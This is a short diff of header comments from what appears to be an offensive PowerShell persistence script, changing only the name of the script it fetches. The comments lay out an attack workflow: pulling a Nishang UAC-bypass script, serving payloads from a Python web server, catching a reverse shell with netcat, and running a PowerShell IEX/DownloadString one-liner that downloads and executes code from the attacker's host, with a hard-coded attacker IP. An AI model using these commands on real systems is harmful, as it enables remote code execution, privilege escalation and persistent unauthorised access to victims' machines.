@@ -7,7 +7,7 @@
 # -> https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1
 # Start a Python http server -> python -m http.server 80
 # Listen on <LPORT> to recieve the Reverse Shell -> nc -nlvp <LPORT>
-# Run this script from a cmd.exe (You may need to press <Enter> a couple of times) -> powershell IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/Auto_Persistence.ps1')
+# Run this script from a cmd.exe (You may need to press <Enter> a couple of times) -> powershell IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/Win_Auto_Persistence.ps1')
 # Remember to change LHOST and LPORT to your attacker IP and the listening port for the Reverse Shell
 
 $LHOST = "192.168.1.64"
